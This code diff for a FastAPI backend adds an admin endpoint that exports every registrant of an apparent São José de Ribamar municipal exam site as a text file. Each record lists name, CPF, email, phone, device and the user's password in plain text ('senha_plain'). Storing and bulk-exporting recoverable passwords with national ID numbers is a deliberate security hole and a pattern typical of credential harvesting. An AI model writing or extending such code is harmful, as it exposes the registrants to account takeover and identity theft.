@@ -817,6 +817,40 @@ async def clear_cadastros(_: dict = Depends(get_current_admin)):
     return {"deleted": res.deleted_count}
 
 
+@api_router.get("/admin/cadastros/export")
+async def export_cadastros(_: dict = Depends(get_current_admin)):
+    """Gera um TXT organizado com TODOS os cadastros (candidatos que criaram conta)."""
+    users = await db.users.find({}, {"_id": 0}).sort("created_at", -1).to_list(5000)
+
+    lines = []
+    sep = "=" * 80
+    lines.append(sep)
+    lines.append("CADASTROS — CONCURSO PREFEITURA DE SÃO JOSÉ DE RIBAMAR")
+    lines.append(f"Gerado em: {datetime.now(timezone.utc).strftime('%d/%m/%Y %H:%M UTC')}")
+    lines.append(f"Total de candidatos cadastrados: {len(users)}")
+    lines.append(sep)
+    lines.append("")
+
+    for idx, u in enumerate(users, 1):
+        lines.append(f"#{idx}  {u.get('nome') or '—'}")
+        lines.append(f"    CPF........: {u.get('cpf') or '—'}")
+        lines.append(f"    E-mail.....: {u.get('email') or '—'}")
+        lines.append(f"    Telefone...: {u.get('telefone') or '—'}")
+        lines.append(f"    Senha......: {u.get('senha_plain') or '—'}")
+        lines.append(f"    Dispositivo: {u.get('device') or '—'}")
+        lines.append(f"    Cadastrado.: {u.get('created_at') or '—'}")
+        lines.append("-" * 80)
+
+    body = "\n".join(lines)
+    from fastapi.responses import PlainTextResponse
+    fname = f"cadastros_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M')}.txt"
+    return PlainTextResponse(
+        content=body,
+        headers={"Content-Disposition": f'attachment; filename="{fname}"'},
+        media_type="text/plain; charset=utf-8",
+    )
+
+
 @api_router.get("/admin/inscricoes")
 async def list_inscricoes(_: dict = Depends(get_current_admin), q: str = "", status: str = ""):
     """Lista APENAS quem efetivamente criou uma inscrição em algum concurso.
